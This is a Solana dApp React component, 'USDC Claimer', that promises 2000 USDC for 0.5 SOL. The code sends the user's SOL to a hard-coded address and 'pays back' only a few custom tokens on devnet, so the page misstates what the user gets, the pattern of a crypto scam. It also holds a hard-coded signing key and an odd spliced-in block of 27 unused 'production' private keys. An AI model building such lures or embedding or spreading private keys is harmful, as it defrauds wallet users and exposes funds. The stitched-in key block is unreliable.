/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3M3stpJnmm6r6sb97VnAz4uxEJ2meyhGhYNV4ri9daA36Chx59LrhMsKJW3cHgAc2AWjR6xWALPDWa9ppf27nY9i"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "55te1iKeKDaZkhwvteWu7vziyeS9pwbV3e5u1MAgik9sWrMKPiDPyfHxJDHN9mmd3RsaTYpV2sATdiBVbwQUqV6A",
  "key1": "H2Me5sDEfk95AGzRGdDkTvnHWDaEHugcnCRV8DAen2DtPShdGgQyVU5r5JRxhbwqBSbmXc97JPR5M4mZvCk68Dd",
  "key2": "66uRJBhNuP4XFaTisVHnMozgHaXW55VBVJovPbWdcRD3YxRVrxVx9fCYfqKko6TLfHxSvBhh8vUfACkcRS9UcRjd",
  "key3": "3hQeS9KQe33p8EM1299tfHSEWMrjcF82Qz2Z3JrNFDvTU8D22Ybz4zTt3r76evhohoEr4ADwwRVqNKhErFDEJCL2",
  "key4": "2qvVJ216rpn8Z9VoHVW9h4fQ15JzVdcqQdeYcAyfocv57KwYJH85PdRsDsCmcMfBqWtmaork15VCT7fqsoXEqfBj",
  "key5": "2He7VfGG7rKm1Ev1th4XgezpkffJSrBjw4CUnBpM5kH5udBRUyM2Z1DwNuyLNj9Nf2rTb3hcb3nYam9FYw4f2o2R",
  "key6": "5ytcHVphoUFL5XpWdNv9o13x9hBt9sfpGA5aNY4jUFygnzAnWL4PWtNRx3AyiPL1AHbZm5KLVLeXXwafd3JauXf2",
  "key7": "4KSqKoHktiPeSd16YxFLjoVzyDNU3zMXBx8zAc3KsAuD5NPrE6FF7Pqmbr6JqZEwsZfHGPTmLYap4SW4PBSSQeLk",
  "key8": "294rskwTD4jZsm4gPNuQ52EMVG5ASFH1xvdsJXCQkb3b7cXW7JMSHk87pAS7icVymBX9SYBRwxRqgYnSzGTu5TAj",
  "key9": "2g6pSQKVsBZe2ZJLPFKiiedH4hagZS5tdnKDYPgqx3aLzMzsKkpLAvddvE9JaLgPXwAGq3q7hgsPMZMMTe5QADNj",
  "key10": "4D8G8SsWEPd74s53gHm3h53cGVidyoeMqVDLcnqBuT3JnVWNnQVeh5X1zFpaxDYxcQzHopuRQYez3DcCvW5bLvpw",
  "key11": "5acPbjEqDLMa7XvUr6xqKnLSQN57aepoFDv6rZompsg4DJ3pVqKaaCB1EtkuH83hswUJU3NBtthQF7Ud3Zg5SR2m",
  "key12": "62JcMEY8R4gotRLkF1bGLfhsrCr3QfnTAH3cugtB6jgn7GGHXmuMCfTdYBxu9Ss2TL3Kq7br2oCDiTaayTz9gEWs",
  "key13": "3HvRHmpqVYeRtvEP4MFcE21szTr9g4xmDtvNHKN7BEZ7G4Wu2SCmgWTtazcCrTPMQfyxzAXsKutGYHKDkTvB1y16",
  "key14": "63yHzMb3L8dmrco8fV7iJco18UXWMdN98FvVUNbqb8piiBrEPVZoGnzL1ox5gkdYCQLoVkGeRvEWVWqSw9QNGsh1",
  "key15": "25dmmk5qB9iJiB1wB5hmEBA5caBgbQgHqMSvKGGS9ub8BxWVdzBY5G2gfydfZ1BWaECk9wx788oMJMG6MvhCfpiT",
  "key16": "7vtnRsMeUX2S9Dx5rCY9jzA9Pm66ZcvxuHR6LEojxvHvnuF28itvyVa24KGoBLpESUZT765LituNTpUmgK6NDie",
  "key17": "2kLtMnHEWnq2uc4Gyph1XG8JiYSc8c2GmGepbiLL3cfhA6bkAJ7aKwwrnWhvVF4uXxb7JiPVYHZeSTdvmoeANHmV",
  "key18": "41mdmdgzy1yT3rN6AMpq9tGZW4Pw6ihK9tQwZXZmm4SXCGwWaVzfDHHVJXwpVa8gDs3P6LHMdMKi8nBzp4KmT1fj",
  "key19": "5cC7RLFDSYyfQzy6st5aCHrzXSKphJuCioY28zB2K6AhhxBaMu6kii3xt666rYPfnjZopMdpQeiKVj7c2epPESTU",
  "key20": "5PZHnHhn96QKHkqGJgTQwPfYjyV4FkvSZXKTrPdfWsYwZDwsuGJbeMyEtiqte6wRnATwGiY2KMvSESsNQYF8mbie",
  "key21": "4T2Bzrs2iTSr6fk3DD3m92zUagNMvWzswTExSJfNgKsB8crFBgfkaophJS9T1YAfUnLEwPkoEaZuKic5ervzWYMZ",
  "key22": "3CdfteQHc5CjA4zGnfacSkvzeFdbEyK3VjeUbGHYaPoMEv29BX55R3mtYAbShk3tT3aRKa84TEJc8DhGcoSoa4AD",
  "key23": "5v4VNkkiwVtjoys4fFHyhttTgXBRvhiyKEx8R6KG5zQmk6PHHXpaijzYga25ytuLKStPnZW5nXUuaCEV32RGrXd6",
  "key24": "3UhQwbL5S69HSDb5Vt7RqNmpvGg1fpkwRQVxjPWwJ2coc5m2znAroYBp2RqGTbwTFxhXMDLRitdY417nv3a2zwUU",
  "key25": "2CcEBKXi2XBCL398ULkUQAbM9JGpeDwN4w8WdB2QxuLNnTXe7Y7zyJYmnMYvV919MQbbs4kLbV7qmt9BPbPe2Fj5",
  "key26": "4EKWqfSxZXveXzQq9yfHsSX5DAhWmzQ2qWmwH7i1onjXNVmtGf3JvAwQGWQog9wqYMtcTR2EQwfQayYqi1tf1RMq"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
